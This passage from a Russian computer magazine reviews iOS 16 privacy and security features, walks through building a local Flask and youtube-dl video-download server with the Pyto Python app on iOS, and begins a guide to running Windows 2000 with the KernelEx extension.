  Сама ком пания Apple позиционирует Safety Check в качестве помощи
людям в ситу ациях домаш него насилия, но ее возможности этим не ограничи-
вают ся. C исполь зованием этой фун кции ты можешь сбросить настройки дос-
тупа и системные разрешения на кон фиден циаль ность для приложений (как
всех скопом, так и по отдель ности). То же самое ты мог сделать и рань ше,
но тебе приш лось бы хорошень ко полазить по множеству пун ктов меню, отзы -
вая настройки для каждого приложения по отдель ности, либо сбросить сразу
все настройки устройства, что очень неудобно.
  Наконец, при помощи Safety Check можно ограничить прием сообщений
(SMS и iMessage) и звон ков FaceTime одним устройством. Она отключает
облачную фун кциональ ность, благодаря которой ты можешь видеть тек стовые
сообщения и входящие звон ки FaceTime не толь ко на своем iPhone, но и
на дру гих устройствах Apple, привязан ных к твоей учет ной записи, например
iPad или MacBook. Опять же ничего сверхъестествен ного — то же самое мож-
но сделать и вручную, но имен но в Safety Check все перечисленное собрано
в одном месте, а сбросить выдан ные разрешения можно бук валь но в пару
нажатий.


ÍÎÂÎÅ ÐÀÇÐÅØÅÍÈÅ: ÄÎÑÒÓÏ Ê ÁÓÔÅÐÓ ÎÁÌÅÍÀ

Пом нишь, сколь ко шума наделали появившиеся в iOS 14 бан неры, уведом -
ляющие о том, что приложение прочитало дан ные из буфера обмена?





                 Уведом ление о чтении буфера обмена

Многих эти бан неры раздражали и продолжают раздражать до сих пор,
но отключить эту возможность на уровне системы невозможно. В iOS 16 раз-
работ чики наконец приш ли  к очевид ному решению: теперь для доступа
к буферу обмена приложения должны запрашивать разрешение.





  Для доступа к буферу обмена приложениям теперь требует ся разрешение

Под робнее об этом можно прочитать в статье UIPasteBoard’s privacy change
in iOS 16 , здесь же отмечу, что, однажды разрешив приложению доступ
к буферу обмена, окош ка с назойливым запросом ты боль ше не увидишь.
   Кстати, интересно, сбрасывается ли новое разрешение новой фун кцией
Safety Check? Это мы сможем проверить толь ко после официаль ного выхода
iOS 16. В бета-версиях iOS 16 единожды выдан ное разрешение не отобража-
ется в общем списке разрешений получившего его приложения, так что отоз-
вать или сбросить его никак не получит ся.
  И еще одно наблюдение: запрос не появляет ся, если ты сам инициируешь
вставку из буфера обмена, коснувшись коман ды «Вставить» во всплы вающем
меню. Соот ветствен но, новая фун кция ограничивает лишь фоновый доступ
к буферу, то есть такой доступ, который приложения получают без участия
и явного сог ласия поль зователя. На дан ный момент фун кция выг лядит сырой
и несколь ко недоделан ной, но посмотрим, что будет в окон чатель ной версии
iOS 16.


ÇÀÙÈÒÀ ÑÊÐÛÒÛÕ È ÓÄÀËÅÍÍÛÕ ÔÎÒÎÃÐÀÔÈÉ

Возможность скрыть фотог рафии появилась в iOS доволь но давно. Почитать
об  этой  возможности можно,  например,  на официаль ном  сайте  Apple.
До выхода iOS 16 скры тые фотог рафии всего лишь попадали в специаль ный
аль бом с «говорящим» названием. Кстати, аналогичным образом система пос-
тупала и с удален ными фото и видео.
  Скры тые и удален ные фотог рафии при этом исчезали из основной лен ты
в приложении Photo, но просмотреть содержимое этих аль бомов было проще
простого: достаточно лишь открыть папку с соот ветству ющим названием.
Многих поль зователей такое положение дел не устраивало: в слу чаях, ког да
iPhone с плохо скры тыми фотог рафиями попадал в руки злоумыш ленников
или просто любопыт ных, доходило даже до уволь нений.
  В App Store расцвел целый букет разнообразных приложений, скры вающих
или защищающих доступ к приват ным фото и видео. Удобство, безопасность
и приват ность подобных приложений вызывали массу вопросов. Наконец,
в iOS 16 появился механизм, позволяющий защитить приват ные фото и видео
от слу чайного просмотра стан дартны ми средствами операционной системы.





  В iOS 16 появилась возможность защитить приват ные фото и видео
  от слу чайного просмотра

В новой версии iOS аль бомы скры тых или удален ных фото и видео будут
защищены: для доступа к ним по умолчанию пот ребу ется авторизация через
Face ID, Touch ID или с помощью кода блокировки. При желании поль зователь
сможет отключить такую авторизацию в настройках.


ÔÓÍÊÖÈÈ, ÎÒÍÎÑßÙÈÅÑß Ê ÁÅÇÎÏÀÑÍÎÑÒÈ

Описан ные выше фун кции имели отношение к защите кон фиден циаль ности
поль зователя; теперь давай поговорим о возможностях, призванных повысить
безопасность  устройства  или  сделать  исполь зование  прежних  фун кций
безопасности более удобным.


Lockdown Mode
Ин тереснее всего в iOS 16, хотя, вероятно, этой возможностью и ред ко поль -
зуют ся, специаль ный режим Lockdown Mode, разработан ный для защиты
людей, чья обществен ная или профессиональ ная деятель ность под вергает их
риску персонализирован ных атак.





                           Lockdown Mode

Для активации режима пот ребу ется не толь ко включить дан ную настройку, но и
перезаг рузить iPhone. После этого смартфон заработает в особом безопасном
режиме, некоторые фун кции устройства будут ограничены. В частности:
 • В сообщениях будут блокировать ся все вложения, кроме фотог рафий. Так -
  же отключают ся некоторые фун кции, например пред варитель ный просмотр
   ссы лок.
 • В браузере отключают ся некоторые технологии, например JIT-ком пиляция
   JavaScript (за исключением сайтов, добавленных в белый список).
 • Блокиру ются входящие звон ки, запросы и приг лашения от незнакомых або-
   нен тов, которым поль зователь рань ше не звонил.
 • Ак тивиру ется уже знакомый режим ограничения USB, в котором после бло-
   кировки экрана iPhone запрещена передача дан ных между телефоном
   и компь ютером или аксессу аром.
 • Наконец, режим блокировки не позволяет установить профиль кон фигура-
   ции или зарегистрировать устройство в системе внеш него управления
  MDM.

Набор ограничений такой, чтобы исполь зование устройства не сделалось сов-
сем невозможным. Что-то мне под сказывает, что в режим Lockdown будут
переводить телефоны не столь ко журналисты и политики, сколь ко родители,
желающие обезопасить своих детей. Если тебя привлекает эта идея, то после
включения дан ного режима на iPhone ребен ка не забудь набрать с защищен -
ного таким образом аппарата свой номер, иначе ты боль ше не сможешь
до него дозвонить ся.


Passkeys
Разработ чики Apple придумали очеред ной способ онлайновой аутен тификации,
который должен заменить логины и пароли. Сог ласно их замыслу, при регис-
трации на под держивающем новую технологию сайте будет создана пара клю-
чей асим метричного шифрования, один из которых (публичный) сохраняется
на самом сайте, а второй (приват ный) — в связке ключей твоего устройства
(это может быть iPhone, iPad или компь ютер Mac). Приват ные ключи син хро-
низируют ся через iCloud с помощью облачной связки ключей и защищаются
сквозным шифрованием.





                               Apple Passkey

Ког да ты попытаешь ся залогинить ся на сайте, тот сгенерирует сообщение,
зашифрован ное твоим публичным ключом. Расшифровать это сообщение смо-
жешь толь ко ты, как держатель приват ного ключа, который, напом ню, хранит ся
на твоем iPhone.
   Расшифровав сообщение, твой смартфон отправит на сайт ответ, под -
писан ный приват ным ключом. Сайт, в свою очередь, сможет проверить под -
линность отклика, верифицировав твою цифровую под пись все тем же пуб-
личным ключом. Как видишь, все просто, прозрачно и в рам ках классической
схемы асим метричного крипто.
  Пред полагается, что вход на исполь зующие дан ную технологию сайты
будет совершенно прозрачным, если для этого исполь зует ся одно из при-
вязан ных к твоей учет ной записи устройств Apple. Если же ты захочешь войти
на сайт с дру гого устройства (например, с компь ютера под Windows), то тебе
придет ся сканировать QR-код, исполь зовав для этого свой iPhone. Для входа
пот ребу ется разблокировать устройство, что должно под твердить твою лич-
ность.





  Для авторизации под Windows придет ся отсканировать специаль ный QR-
  код

В Apple считают, что новая система со временем наберет популярность.
Для начала в ком пании договорились с такими монстрами, как eBay, PayPal,
Microsoft, NVIDIA, Best Buy, Cloudare и Carnival. Вероятно, список будет
со временем расширять ся, по крайней мере в США, где каждый второй смар-
тфон — iPhone. Под робнее о новой системе можно почитать на сайте
Crast.Net .


Rapid Security Response
Эта фун кция описана на сайте Apple невнятно, но ее суть достаточно проста:
включение Rapid Security Response позволяет устанавливать промежу точные
обновления  системы,  аналогом  которых выступают  ежемесячные  пат чи
безопасности Android.





                         Rapid Security Response


Face ID â àëüáîìíîé îðèåíòàöèè
Тут еще проще: на iPhone 13 и 14 исполь зовать Face ID можно будет как в пор-
трет ной, так и в аль бом ной ориентации. Напом ню, кстати, что относитель но
недавно в iOS 15.4 появилась возможность исполь зовать Face ID на iPhone
в слу чаях, ког да у человека на лице медицин ская маска, а еще рань ше, в iOS
14.5, такая же фун кция добавилась в часах Apple Watch. Если в Face ID опре-
делялось, что поль зователь в медицин ской маске, то с помощью надетых
на руку и разблокирован ных часов Apple Watch можно было разблокировать
iPhone. Обрати внимание: обе этих возможности появились в промежу точных
обновлениях системы, хоть и были анон сированы заранее.





         iPhone можно разблокировать c помощью часов Apple Watch


IOS 14 È 15: ×ÒÎ ÌÛ ÏÐÎÏÓÑÒÈËÈ

Apple далеко не всег да сразу внед ряет фун кции, анон сирован ные в момент
выхода новой версии iOS. Так, Отчет о кон фиден циаль ности приложений
появился лишь с выходом iOS 15.2, хотя был анон сирован во время релиза iOS
15.





              От чет о кон фиден циаль ности приложений

В отчет попадает информация о выдан ных приложениям разрешениях, о том,
как приложения их исполь зуют и ког да они делали это в последний раз. Нап-
ример, здесь можно узнать, что и ког да запрашивало информацию о твоем
местоположении.
  А еще рань ше, в iOS 14.5, в приложениях наконец заработала фун кция,
которую в Apple назвали App Tracking Transparency. С этой версии iOS приложе-
ния должны запрашивать сог ласие на привязку поль зователей к уникаль ному
иден тификатору Advertising ID, который позволяет однозначно иден тифици-
ровать устройство на различных сайтах и в приложениях. То есть следить, какие
сайты ты посещаешь и какими сервисами поль зуешь ся. И если в предыду щих
версиях системы доступ к рек ламному иден тификатору у приложений по умол-
чанию был, то, начиная с iOS 14.5, такого доступа нет, и поль зователь должен
в явном виде сог ласить ся со слежкой. К удивлению разработ чиков «шпи-
онских» SDK, такое сог ласие выдали всего 4% поль зователей.
   Казалось бы, что плохого в том, что за тобой нем ного под смот рят, — тем
более что иден тификатор вроде как аноним ный? Суть кроется в словах «вроде
как».  Бук валь но на днях разразился очеред ной скан дал: оказалось,  что
в течение многих лет полиция массово и без каких-либо юридических заморо-
чек исполь зовала дан ные, любезно предоставляемые сервисом Fog Reveal.
Сервис, в свою очередь, пред лагает американ ская ком пания Fog Data Science
LLC, которая была основана высокопоставлен ными выход цами из Департамен -
та внут ренней безопасности. Как показало журналист ское расследование,
полиция и дру гие государствен ные агентства получили доступ к информации
об истории местоположения более 250 миллионов устройств.
  По действу ющим правилам, если полиция направляет запрос в Google
или Apple о том, какие устройства находились в радиусе N миль от таких-то
координат с такого-то по такое-то время, ей необходимо иметь должным
образом оформлен ное постановление (читай: бумаги, волокита, риск отказа).
Более того, даже с коррек тно оформлен ным постановлением ответа от Google
или Apple иног да приходит ся ждать неделями. Fog Reveal выдаст ответ
на такой запрос автоматически, момен таль но и без каких-то там ордеров.
   Даль ше начинается интересное. Оказалось, что необходимые для обработ -
ки запроса дан ные Fog Reveal честно покупал у рек ламных медиаторов,
которые, в свою очередь, приобретают дан ные у владель цев рек ламных SDK.
В их число входят такие монстры, как Waze, Starbucks и крупнейшая в мире
«экстремист ская организация», владеющая популярными соцсетями, а так же
сот ни дру гих ком паний.
   Разумеется, рек ламные иден тификаторы полностью аноним ны. Пред ста-
вители Fog утверждают, что не имеют возможности установить кон крет ное
устройство или его владель ца на основе имеющихся дан ных. Власти с этим
не спорят: «Связи между рек ламным иден тификатором и личной информацией
нет». И сразу после этого добавляют: «Но, если мы хорошо разбираемся в том,
что делаем, мы сможем установить владель ца устройства».
   Прак тика показала, что проблем с выявлением владель цев смартфонов
на основе даже такой аноним ной информации у полиции не возникает (о том,
как это делается, можно прочесть, например, в статье «Call Detail Record.
Как полиция вычисляет преступников без сложной техники»).


ÂÛÂÎÄÛ

Ког да я начинал работать над этой стать ей, о фун кциях приват ности и безопас-
ности в iOS 16 не было известно почти ничего. Со временем появлялись все
новые кусочки паззла, которые наконец оформились в целостную картину.
Нововведений оказалось на удивление много, а под робностей их работы
и деталей технической реализации — на удивление мало. Надеюсь, прочитан -
ная статья поможет тебе разобрать ся, какие новин ки в iOS 16 смогут быть
небесполезны.
ТРЮКИ





           ДЕЛАЕМ ВЕБ-
           СЕРВЕР НА IOS
         И КАЧАЕМ ВИДЕО
          С YOUTUBE-DL





Го ворят, iOS неверо ятно зак рытая сис-
тема:  ни  написать  свою  прог рамму
без лицен зии раз работ чика, ни заставить
iPhone или iPad делать что-то, что не одоб-
ряют в Apple. Сегод ня я поз наком лю тебя       Андрей Письменный                                                                                      Главный редактор
с Pyto — интер претато ром Python для iOS,         apismenny@gmail.com
который   поз воля ет   тво рить...   если
не чудеса, то как минимум мно гие вещи,
которые раньше счи тались невоз можны ми
без джей лбрей ка.


Сначала  посмотрим  на  сам  Pyto,  а  потом  смастерим  простень кий
веб-интерфейс, который поможет более удобно скачивать видео через
youtube-dl. Работать он будет локаль но на iOS.


PYTHONISTA

Pyto — не первая попыт ка создать среду разработ ки на Python для портатив-
ных устройств Apple. Уже много лет существу ет приложение Pythonista. Оно
слу жило мне верой и правдой, позволяя как решать на ходу сиюминут ные
задачи (что-то посчитать, расшифровать, сгенерировать последователь ность),
так и создавать неболь шие полезные приложения. В Pythonista есть свой гра-
фический интерфейс и некоторые возможности для взаимодействия с сис-
темой. К  примеру, можно сделать  периодически  обновляемый  вид жет
для экрана Today.





Од нако разработ ка Pythonista остановилась уже боль ше пяти лет назад. Автор
за это время появился на публике всего один раз и выпустил неболь шой
апдейт, который позволил приложению запускать ся на современ ных версиях
iOS. А затем снова пропал: ни ответов на форуме, ни постов в твит тере. И уж
конечно, никаких новых фич в Pythonista.


ÂÑÒÐÅ×ÀÉÒÅ — PYTO!

И тут на сцену выходит Pyto — тоже творение единствен ного разработ чика,
но зато полного сил и энту зиазма. А так же, кажет ся, желания испы тывать тер-
пение модераторов Apple, постоян но идя по краю дозволен ного в App Store.
Pyto, к примеру, умеет запускать приложения в фоне, позволяет создавать
локаль ные веб-серверы и даже имеет встроенную под держку репозитория
PyPI — ставить пакеты можно бук валь но одной кнопкой!




                       Ус тановка при ложений внут ри при ложения до сих
                      пор была абсолют ным табу в iOS. Любые лазей ки
                        в Apple прикрывали, из-за чего в ту же Pythonista
                      новые пакеты при ходи лось протас кивать слож ной
                       цепоч кой дей ствий. Не исключено, что автору
                        Pyto повезло и модера торы прос то проморгали
                      нарушения. Или же разрешать прог раммис там
                        некоторые вольнос ти — это новая полити ка Apple.
                    Поживем — уви дим!


У Pyto боль шие возможности для работы с математическими фун кциями —
к примеру, пакет NumPy, без которого не обходят ся любые мало-маль ски
сложные вычисления, установлен по умолчанию. Так же в Pyto удобно строить
графики и даже поль зовать ся кое-какими средствами для машин ного обу -
чения. К примеру, мне без тру да удалось поставить Gensim и поразвлекать ся
с разбором тек стов.
   Как и Pythonista, Pyto стоит денег: после трехдневного пробного периода
тебя попросят раскошелить ся на 750 рублей за базовую версию и 1400 за рас-
ширен ную, с набором библиотек, требующих ком пилцяии. Но необходимость
раскошеливать ся — не главный недостаток Pyto.
  Основной проблемой этого приложения остается невероятная сырость.
Настоль ко мощная, что в болото багов можно провалить ся по колено, если не с
головой. И я не преувеличиваю: один раз мне удалось зак линить Pyto настоль -
ко, что даже перезаг рузка не помогала.
  Од нако если держать ся проторен ных дорожек и поль зовать ся Pyto бережно
и акку рат но, то он сослужит отличную службу.


ÎÑÎÁÅÍÍÎÑÒÈ PYTO

Êîìàíäíàÿ ñòðîêà
В Pyto есть коман дная строка. Но учти, что это не Bash и внут ри — не Linux.
Это  свой коман дный  интерпретатор  Pyto. Он под держивает  несколь ко
основных команд Bash — список можно узнать коман дой help. Отсюда ты
запустишь скрипты на Python, но на установку каких-то дру гих прог рамм рас-
считывать не приходит ся.





Èñïîëüçîâàíèå ôàéëîâîé ñèñòåìû
Важное отличие iOS от дру гих операционок — в том, насколь ко силь но здесь
кон тролиру ется доступ к файловой системе. Без разрешения скрипт в Pyto
не может получить доступ ни к одной папке!
   Хорошая новость зак лючается в том, что запрашивать права очень просто.
Для этого в Pyto есть модуль le_system.
  Пишем простень кий скрипт:


import file_system as fs
path = fs.FolderBookmark()
print(path)

После его запуска появит ся диалоговое окно для выбора папки. Выбрав ее, ты
дашь Pyto права на доступ ко всем файлам в ней. Имен но Pyto, а не своему
скрипту! Это означает, что даль ше доступ к этой папке будет открыт всем
прог раммам внут ри Pyto, в том числе после любых перезапусков и перезаг -
рузок.
   Если же по ходу исполнения скрипта тебе понадобит ся получать доступ
к  разным файлам или папкам, ты можешь восполь зовать ся фун кциями
import_file() и open_directory() из того же модуля. Каждый раз при их
вызове будет появлять ся диалоговое окно для выбора файла или папки.


Çàïóñê ôîíîâûõ çàäà÷
Еще одна особен ность iOS — неисполь зуемые приложения принудитель но
завершают ся и выг ружаются из памяти (если встретишь людей, кропот ливо
чистящих историю задач в iOS, передай им, что это мартышкин труд — ОС
сама отлично с этим справит ся). Но что сделать, чтобы прог рамма работала
в фоне непрерывно? Для разных типов задач в iOS существу ют API, все же поз-
воляющие фоновое исполнение.
  В Pyto исполь зует ся нехит рый прием: если тебе нужна работа в фоне, то
приложение будет делать вид, что проигры вает аудиофайл, тог да как никакого
воспроизведения в реаль ности не происходит. Для активации этого поведения
исполь зуй модуль background.
   Чтобы прог рамма начала лучше держать ся на плаву, достаточно написать
что-то в таком духе:


import background as bg


with bg.BackgroundTask() as task:
    # Код для исполнения в фоне


Äðóãèå ôè÷è è ìîäóëè
В Pyto есть под держка еще несколь ких интересных возможностей: например,
ты можешь активировать свои скрипты вызовами из Shortcuts или URL-схему
и передавать им парамет ры. Дру гая мощная вещь — мост между Python
и Objective-C на основе библиотеки Rubicon-ObjC, он позволяет вызывать
фун кции из нативных фреймворков.
  К Pyto прилагается неплохой набор модулей, для работы которых требует ся
ком пиляция. Самостоятель но добавлять такие модули, к сожалению, нель зя.





А так же несколь ко собствен ных модулей для работы с iOS. Мы уже рассмот -
рели le_system и background, но есть и дру гие:
 • apps — интерфейсы к популярным сторон ним приложениям. Позволяют
   из скрипта активировать дру гую прог рамму и сказать ей сделать то
   или иное действие;
 • pyto_ui —  фреймворк  для  разработ ки  приложений  с  графическим
   интерфейсом. Позволяет рисовать окош ки, кнопочки и прочие элемен ты
   управления;
 • widgets и watch — библиотеки для создания вид жетов для экрана
   «Сегод ня» и часов Apple Watch;
 • sound, music и speech отвечают за воспроизведение зву ка, музыки
   и син тез речи;
 • notifications позволяет отправлять оповещения;
 • location и motion дают возможность получать геокоординаты устройства
   и опрашивать дат чики движения;
 • pasteboard — взаимодействие с буфером обмена;
 • multipeer — позволяет обменивать ся дан ными в режиме точка — точка.

Разбор всех этих замечатель ных возможностей не уместится в одну статью, так
что выберем одну неболь шую задачу, на которой испы таем Pyto в деле.


ÏÈØÅÌ ÂÅÁ-ÑÅÐÂÅÐ

Çàäà÷à
Прог лядывая доступные в Pyto модули, я заприметил youtube-dl — широко
известную утилиту для скачивания видео с видеохостингов. В том числе и тех,
которые пытаются защитить кон тент от подобных действий. В общем, отличная
шту ка! Но поль зовать ся модулем Python или утилитой для коман дной строки
на мобиль ном устройстве не очень-то удобно.
   Есть множество способов приделать с помощью Pyto более удобный
интерфейс  к  youtube-dl, в том числе написать графическое приложение
на одном из доступных GUI-фреймворков. Однако мне приш ла в голову мысль
попробовать исполь зовать Pyto в качестве локаль ного веб-сервера. Заод но
можно будет посмотреть, как тут дела с веб-разработ кой.


Èíñòðóìåíòàðèé
Первым делом нам пот ребу ется веб-фреймворк или как минимум библиотека,
которая будет упрощать работу с HTTP. В докумен тации мне встретилось упо-
минание Tornado и Django, но для нашей задачи и то и то — оверкилл. Дос-
таточно будет Flask, который без проблем установился коман дой pip install
flask и заработал.
   Чтобы еще силь нее упростить себе жизнь, я буду исполь зовать клиент ский
фреймворк  HTMX,  который  позволяет  делать  асин хрон ные  запросы
без исполь зования JavaScript. С ним достаточно задать тегу несколь ко HTML-
атрибутов с информацией о том, куда слать запрос и куда под ставлять
получен ный ответ. Осталь ное HTMX сделает сам.
   Ну и чтобы внеш ний вид прог раммы был не колхозным, под ключим
минималистичный CSS-фреймворк Pico.css.


Êîä
Первым делом импортируем все необходимое.


import flask
from youtube_dl import YoutubeDL
from threading import Thread
import sys
import urllib.request
import os
import background as bg
import file_system as fs

Инициализиру ем глобаль ную перемен ную path и задаем путь к папке, куда
будут скачивать ся видео. Под разумевает ся, что права на нее ты уже дал
при помощи fs.FolderBookmark().


path = '/private/var/mobile/Library/Mobile Documents/
com~apple~CloudDocs/Pyto/'

В пару к веб-серверу обычно делают базу дан ных, но, посколь ку мы будем
работать исключитель но в дев-окру жении (в Pyto продак шен все равно не под -
нять), можно просто исполь зовать глобаль ные перемен ные и хранить дан ные
в памяти во время работы прог раммы.
  Инициализиру ем две перемен ные: в одной будет хранить ся имя скачива-
емого файла, в дру гой — его размер.


filename = ''
size = 0

Создаем экзем пляр класса Flask и делаем  так, чтобы он активировался
при запуске скрипта:


app = flask.Flask(__name__)
if __name__ == '__main__':
    app.run()

Даль ше создаем основу нашей прог раммы — фун кцию для скачивания файла.
Она получает ссылку на файл (link) и имя файла для записи (filename). Внут -
ри мы при помощи urllib.request.urlopen() создаем запрос и при помощи
request.getheader() получаем длину файла (заголовок content-length).
Это значение сохраняем в глобаль ную перемен ную size. После этого акти-
виру ем фоновую задачу, которая сводит ся к скачиванию файла методом
urllib.request.urlretrieve().


def download_file(link, filename):
    with urllib.request.urlopen(link) as request:
        global size
        size = int(request.getheader('content-length'))
    with bg.BackgroundTask() as task:
    urllib.request.urlretrieve(link, path + filename)

Даль ше — вспомогатель ная фун кция для получения текущего прог ресса в про-
цен тах. Формула проста: нам понадобит ся поделить текущий размер файла
на  полный,  а  затем  умножить  на  сто  процен тов.  Текущий  замеряем
при помощи os.path.getsize() (путь и имя файла у нас хранят ся в глобаль -
ных перемен ных). Если файла еще нет, возвращаем 0.


def get_progress():
    filepath = path + filename
    if os.path.exists(filepath):
        real_size = os.path.getsize(filepath)
        progress = int(real_size / size * 100)
        return progress
    else:
        return 0

Создаем обработ чик, который будет возвращать главную страницу.


@app.route('/')
def hello():
    return '''
        # Здесь код страницы
    '''

Сам код страницы следующий:


<html>
<head>
<script src="htmx.min.js"></script>
<link rel="stylesheet" href="pico.min.css">
</head>
<body><main class="container"><article>
<form hx-get="/go" hx-target="this" hx-swap="outerHTML">
<div>
  <label>Ссылка на видео:</label>
  <input type="text" name="video_url" value="" size="100">
  <button class="btn">Качаем!</button>
</div>
</form>
</article></main></body>

В сек ции head мы под ключаем файлы с нашими фреймворками — пред -
полагается, что ты их пред варитель но скачал, но вместо этого можешь
получить ссылки на версии в CDN и прописать их вместо названий файлов.
  В body создаем теги main и article, чтобы восполь зовать ся сеточной
версткой и вывести акку рат ную белую карточку.
  Но самое интересное — это тег form:


<form hx-get="/go" hx-target="this" hx-swap="outerHTML">

Здесь мы оставляем указания для HTMX: дергать сервер по адресу /go,
а получен ным резуль татом заменить весь тег. Таким образом форма у нас
будет заменена на прог ресс-бар.
   Теперь давай добавим обработ чик для пути /go.


@app.route('/go', methods=["GET"])
def go():

В качестве парамет ра поль зователь приш лет нам ссылку на видео, рас-
положен ное на каком-то видеохостинге. Исполь зуя модуль youtube_dl, мы
получим прямую ссылку на файл и название ролика. Для этого сначала соз-
дадим словарь с опциями  (в каком  качестве  качать), потом экзем пляр
youtube_dl (назовем ydl), а потом передадим методу ydl.extract_info()
наш URL из аргу мен та запроса. Достаем ссылку для скачивания и заголовок
фун кцией info_dict.get().


    youtube_dl_opts = {'format': 'best'}
    with YoutubeDL(youtube_dl_opts) as ydl:
     info_dict = ydl.extract_info(flask.request.args['video_url'],
download=False)
     video_url = info_dict.get("url", None)
     video_title = info_dict.get('title', None)

Теперь нам нужно задать имя файла и сохранить его в глобаль ной перемен ной
filename. Можно исполь зовать название ролика, но в нем могут попасть ся
сим волы,  которые  не  пон равят ся файловой  системе.  Отфиль тру ем  их
и соберем новую строку.


    global filename
    filename = "".join(i for i in video_title if i not in ":*?<>|/
") + '.mp4'

У нас есть все парамет ры для фун кции download_file. Чтобы наш веб-апп
отдал ответ клиенту и продолжил скачивание в фоне, запустим эту фун кцию
как тред.


    thread = Thread(target=download_file, args = (video_url,
filename))
    thread.start()

Ну и наконец, отдадим клиенту ответ. Это заголовок h2 с названием ролика
и пустой слой с еще одной порцией магии HTMX. На этот раз мы велим ему
запрашивать страницу /status через одну секун ду и пришед шим ответом
заменять наш слой.


    return f'''
    <h2>{video_title}</h2>
    <div hx-get="/status"
        hx-trigger="load delay:1s"
        hx-swap="outerHTML">
    </div>
    '''

Осталось нарисовать прог ресс-бар. Для этого пишем обработ чик /status.
Запрашиваем прог ресс в процен тах у нашей фун кции get_progress() и снова
возвращаем слой с аргу мен тами HTMX: послать новый запрос на /status
еще через секун ду и под менить текущий слой. Сам прог ресс-бар есть
в Pico.css: достаточно исполь зовать тег progress и присвоить аргу мен ту value
текущее значение.


@app.route('/status')
def status():
    progress = get_progress()
    return f'''
    <div hx-get="/status"
        hx-trigger="load delay:1s"
        hx-swap="outerHTML">
    <h3>{progress}%</h3>
    <progress value="{progress}" max="100"></progress>
    </div>
    '''


Ïåðâûé çàïóñê
Итак, собираем всё воедино, не забываем дать Pyto права на указан ную
в самом начале папку и жмем кнопку Run. Запустится локаль ный сервер
и будет отвечать на запросы, сделан ные из браузера.
  Переходим в  Safari и запрашиваем адрес localhost:5000, где у нас
работает сервер. Видим нашу форму (окно с Pyto на моих скрин шотах откры то
для наг лядности, делать так же не обязатель но).





Вставляем URL, и закачка пош ла! Ког да она завершится, файл должен оказать -
ся в задан ной папке.





К сожалению, несмотря на то что мы исполь зовали модуль background, зак рыть
Safari и занять ся чем-то дру гим до окон чания скачивания нель зя. Как толь ко
клиент ская часть веб-приложения перестанет слать запросы к серверу, iOS
таки поставит его процесс на паузу. Однако мои эксперимен ты показали, что
без background процесс с Pyto может затухнуть даже во время того, как ты
сидишь и наблюдаешь за скачиванием.


ÂÛÂÎÄÛ

Мы написали простень кий веб-сервер, который позволяет скачивать виде-
офайлы. При необходимости ты можешь придумать какой-то способ для его
вызова, например при помощи Shortcuts.
   Возможности Pyto тем временем не ограничивают ся разработ кой веб-при-
ложений. С его помощью ты можешь творить самые разные прог раммы
и наделять свой айфон или айпад новыми фичами.
ТРЮКИ





КАК ВЫЖИТЬ В WINDOWS 2000
В 2022 ГОДУ





Если спро сить пользователей, какую вер -
сию Windows они счи тают самой удач ной,
надежной и удобной, мно гие про голо суют
за Windows 2000. Жаль, но под нее уже
не най ти драй веров, не уста новить сов -       Валентин Холмогоров                                                                            Ведущий редактор
ремен ное ПО, не настро ить Wi-Fi, да и         valentin@holmogorov.ru
вообще  пол ноцен но  пользоваться  ей
сегод ня уже невоз можно… Или все-таки
воз можно?  А  давай  про ведем  экспе-
римент:  уста новим  и  скон фигури руем
Win2K так, что бы она смог ла слу жить пол -
ноцен ной рабочей ОС на каком-нибудь
ста ром компьютере!


Безусловно, в 2022 году «официаль ная» Windows 2000 даже с установленным
SP4 — это все-таки операционная система 19-лет ней выдержки, и работа
в ней будет напоминать изощренную пыт ку. На Windows 2000 не установит ся
ни один современ ный браузер, а без него, в свою очередь, ты не сможешь
нормаль но серфить в интернете. Неизбежно возникнут проблемы с под дер-
жкой и дру гих прик ладных прог рамм, с под ключением к беспровод ным сетям,
с периферией, появившейся на свет нам ного позже самой операционной сис-
темы. Главная причина всех этих проблем — отсутствие в устаревших биб-
лиотеках Windows 2000 целого ряда фун кций, которые исполь зуют современ -
ные прог раммы. Ну и конечно же, дефицит драйверов.
  Поэтому мы не будем даже пытать ся вод рузить на компь ютер Windows
2000 в ее первоздан ном виде. Вместо этого мы установим на нее пакет
KernelEx, созданный жителем Японии с таинствен ным ником BlackWingCat.
KernelEx — это расширение ядра для Win2K, которое добавляет в нее ряд биб-
лиотек и системных файлов из Windows XP, в резуль тате чего в этой системе
смогут работать некоторые прог раммы, успешно запускавшиеся в XP и даже
в Vista.
  Некоторые, но, конечно, далеко не все. Тем не менее, внед рив в Windows
2000 KernelEx, установив дополнитель ный софт и нем ножко поковы рявшись
в настройках, можно превратить «двухтысячную» во вполне рабочую систему,
которая вдохнет вторую жизнь в какой-нибудь старень кий ноут бук. А таких
у меня много: для эксперимен тов я выбрал Toshiba Satellite P35 на Pentium
4 с 512 Мбайт оперативки и IDE-вин честером на 40 Гбайт — ког да-то это был
очень мощный игровой ноут бук, а сейчас — почти музейный экспонат. Windows
7 на нем запускает ся, но постоян но жалу ется на нехватку памяти, зато ХР
работает вполне сносно, а значит, должна пойти и «двухтысячная». Итак, прис-
тупим к сеан су нек роман тии!


ÏÀÒ×ÈÌ ÑÈÑÒÅÌÓ

Чтобы установить расширение ядра KernelEx на Windows 2000, нам понадо-
бит ся как минимум сам KernelEx и, как ни стран но, Windows 2000. Еще нам
будет нужна утилита HFSLIP — это прог рамма с откры тым исходным кодом,
пред назначен ная для добавления в установочный образ Windows 2000/XP всех
акту аль ных обновлений.
  Дистрибутив вин ды можно скачать, например, с сайта Old-DOS — там есть
и русские версии, либо с Winworldpc.com — на этом сайте пред ставлены клас-
сические английские дистрибутивы. Я советую выбрать вариант с предус-
тановленным SP4 , причем для наших эксперимен тов лучше исполь зовать
английскую версию, чтобы не возникло кон флик тов с HFSLIP и KernelEx, —
потом при необходимости на установленную систему можно будет накатить
MUI. В качестве аль тернативного варианта можно скачать отдель но образ ОС,
отдель но — сервис-паки и интегрировать их в дистрибутив c помощью прог -
раммы nLite (перед ее исполь зованием не забудь вниматель но прочитать ру -
ководство).
  Последнюю версию KernelEx заг рузи с сайта разработ чика. Сайт пред став-
лен на япон ском язы ке, но для настоящего гика это не помеха: ты можешь
сделать харакири восполь зовать ся онлайн-перевод чиком. В качестве аль тер-
нативы можно скачать KernelEx с отечествен ной площад ки Old-DOS, но там
пред ставлены не самые свежие версии.
   Итак, открой ISO-файл с дистрибутивом в каком-нибудь архиваторе (нап-
ример, 7-Zip) и распакуй его содержимое на диск. Теперь скачай HFSLIP:
для этого перейди по следующей ссылке, в облаке MEGA зайди в папку HFSLIP
